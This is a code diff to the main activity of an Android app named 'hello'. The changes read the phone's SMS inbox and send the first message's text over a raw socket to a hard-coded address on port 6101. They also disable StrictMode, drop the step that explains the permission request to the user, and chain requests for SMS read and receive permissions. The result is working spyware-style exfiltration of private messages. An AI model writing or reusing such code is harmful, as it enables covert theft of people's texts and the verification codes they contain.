@@ -2,6 +2,7 @@ package com.example.soulomoon.hello;
 
 import android.Manifest;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -25,6 +26,7 @@ import java.util.Arrays;
 import java.util.List;
 
 import static android.provider.AlarmClock.EXTRA_MESSAGE;
+import static com.example.soulomoon.hello.MainActivity.sendSocket;
 
 
 public class MainActivity extends AppCompatActivity {
@@ -39,6 +41,7 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         getPermissionSms();
+
         Log.i("获取权限", "获取监听权限");
         setContentView(R.layout.activity_main);
 //        sendSocket();
@@ -51,11 +54,11 @@ public class MainActivity extends AppCompatActivity {
     }
 
     @RequiresApi(api = Build.VERSION_CODES.KITKAT)
-    public List<String> getAllSmsFromProvider() {
+    public static List<String> getAllSmsFromProvider(Context context) {
         Log.i("getAllSmsFromProvider", "begin");
 
         List<String> lstSms = new ArrayList<>();
-        ContentResolver cr = this.getContentResolver();
+        ContentResolver cr = context.getContentResolver();
 
         Cursor c = cr.query(Telephony.Sms.Inbox.CONTENT_URI, // Official CONTENT_URI from docs
                 new String[] { Telephony.Sms.Inbox.BODY }, // Select body text
@@ -81,14 +84,17 @@ public class MainActivity extends AppCompatActivity {
     /** Called when the user clicks the Send button */
     @RequiresApi(api = Build.VERSION_CODES.KITKAT)
     public void sendMessage(View view) {
-        List<String> text = getAllSmsFromProvider();
-        int x = text.size();
-        String y = text.get(0);
-        for (String i : text)
-            Log.d("内容:", i);
+        Context activity = this;
+        List<String> text = getAllSmsFromProvider(activity);
+
+//        int x = text.size();
+        String newText = text.get(0);
+        Log.d("1", newText);
+//        for (String i : text)
+//            Log.d("内容:", i);
 
         Log.d("内容:", "给我权限发送socket");
-        sendSocket();
+        sendSocket(newText);
         Log.d("内容:", "socket sended");
 
 //        Intent intent = new Intent(this, DisplayMessageActivity.class);
@@ -97,17 +103,18 @@ public class MainActivity extends AppCompatActivity {
 //        intent.putExtra(EXTRA_MESSAGE, message);
 //        startActivity(intent);
     }
-    public void sendSocket() {
+    public static void sendSocket(String newText) {
         StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
 
         StrictMode.setThreadPolicy(policy);
         try {
-            String ip = "10.0.2.2";
+            String ip = "192.168.1.129";
             Log.d("", "trying to build connection");
             Socket soc= new Socket(ip,6101);
             Log.d("", "socket builded");
 
-            String toSend= "We are going to send this line";
+//            String toSend= "We are going to send this line";
+            String toSend= newText;
             byte[] buffer= toSend.getBytes("UTF-8");//Encoding in UTF-8 system
 
             DataOutputStream dos= new DataOutputStream(soc.getOutputStream());//gets the output Stream
@@ -123,6 +130,23 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    public void getPermissionSms2() {
+        // No explanation needed, we can request the permission.
+        MainActivity thisActivity = this;
+        Log.d("", "getting permision begin2");
+        ActivityCompat.requestPermissions(thisActivity,
+                new String[]{Manifest.permission.READ_SMS},
+                MY_PERMISSIONS_REQUEST_READ_SMS);
+    }
+
+    public void getPermissionSms3() {
+        MainActivity thisActivity = this;
+        Log.d("", "getting permision begin2");
+
+        ActivityCompat.requestPermissions(thisActivity,
+                new String[]{Manifest.permission.RECEIVE_SMS},
+                MY_PERMISSIONS_REQUEST_RECEIVE_SMS);
+    }
     public void getPermissionSms() {
         // Here, thisActivity is the current activity
         MainActivity thisActivity = this;
@@ -131,33 +155,37 @@ public class MainActivity extends AppCompatActivity {
                 new String[]{Manifest.permission.INTERNET},
                 MY_PERMISSIONS_REQUEST_INTERNET);
 
-        if (ContextCompat.checkSelfPermission(thisActivity,
-                Manifest.permission.READ_SMS)
-                != PackageManager.PERMISSION_GRANTED) {
 
-            // Should we show an explanation?
-            if (ActivityCompat.shouldShowRequestPermissionRationale(thisActivity,
-                    Manifest.permission.READ_SMS)) {
 
-                // Show an expanation to the user *asynchronously* -- don't block
-                // this thread waiting for the user's response! After the user
-                // sees the explanation, try again to request the permission.
 
-            } else {
 
-                // No explanation needed, we can request the permission.
-                ActivityCompat.requestPermissions(thisActivity,
-                        new String[]{Manifest.permission.READ_SMS},
-                        MY_PERMISSIONS_REQUEST_READ_SMS);
-
-                // MY_PERMISSIONS_REQUEST_READ_SMS is an
-                // app-defined int constant. The callback method gets the
-                // result of the request.
-                ActivityCompat.requestPermissions(thisActivity,
-                        new String[]{Manifest.permission.RECEIVE_SMS},
-                        MY_PERMISSIONS_REQUEST_RECEIVE_SMS);
-            }
-        }
+//        if (ContextCompat.checkSelfPermission(thisActivity,
+//                Manifest.permission.READ_SMS)
+//                != PackageManager.PERMISSION_GRANTED) {
+//
+//            // Should we show an explanation?
+//            if (ActivityCompat.shouldShowRequestPermissionRationale(thisActivity,
+//                    Manifest.permission.READ_SMS)) {
+//
+//                // Show an expanation to the user *asynchronously* -- don't block
+//                // this thread waiting for the user's response! After the user
+//                // sees the explanation, try again to request the permission.
+//
+//            } else {
+//
+//                // No explanation needed, we can request the permission.
+//                ActivityCompat.requestPermissions(thisActivity,
+//                        new String[]{Manifest.permission.READ_SMS},
+//                        MY_PERMISSIONS_REQUEST_READ_SMS);
+//
+//                // MY_PERMISSIONS_REQUEST_READ_SMS is an
+//                // app-defined int constant. The callback method gets the
+//                // result of the request.
+//                ActivityCompat.requestPermissions(thisActivity,
+//                        new String[]{Manifest.permission.RECEIVE_SMS},
+//                        MY_PERMISSIONS_REQUEST_RECEIVE_SMS);
+//            }
+//        }
     }
 
     @RequiresApi(api = Build.VERSION_CODES.KITKAT)
@@ -169,10 +197,11 @@ public class MainActivity extends AppCompatActivity {
                 // If request is cancelled, the result arrays are empty.
                 if (grantResults.length > 0
                         && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-
-                    List<String> text = getAllSmsFromProvider();
-                    for (String i : text)
-                        Log.d("内容:", i);
+                    Log.d("内容:", "给我权限监听手机短信接收");
+                    getPermissionSms3();
+//                    List<String> text = getAllSmsFromProvider();
+//                    for (String i : text)
+//                        Log.d("内容:", i);
                     // permission was granted, yay! Do the
                     // contacts-related task you need to do.
 
@@ -183,26 +212,27 @@ public class MainActivity extends AppCompatActivity {
                 }
                 return;
             }
-//            case MY_PERMISSIONS_REQUEST_RECEIVE_SMS: {
-//                // If request is cancelled, the result arrays are empty.
-//                if (grantResults.length > 0
-//                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-//
-//                    Log.d("内容:", "给我权限监听手机短信接收");
-//                    // permission was granted, yay! Do the
-//                    // contacts-related task you need to do.
-//
-//                } else {
-//
-//                    // permission denied, boo! Disable the
-//                    // functionality that depends on this permission.
-//                }
-//                return;
-//            }
+            case MY_PERMISSIONS_REQUEST_RECEIVE_SMS: {
+                // If request is cancelled, the result arrays are empty.
+                if (grantResults.length > 0
+                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+
+                    Log.d("内容:", "给我权限监听手机短信接收");
+                    // permission was granted, yay! Do the
+                    // contacts-related task you need to do.
+
+                } else {
+
+                    // permission denied, boo! Disable the
+                    // functionality that depends on this permission.
+                }
+                return;
+            }
             case MY_PERMISSIONS_REQUEST_INTERNET: {
                 // If request is cancelled, the result arrays are empty.
                 if (grantResults.length > 0
                         && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                    getPermissionSms2();
 
 
 
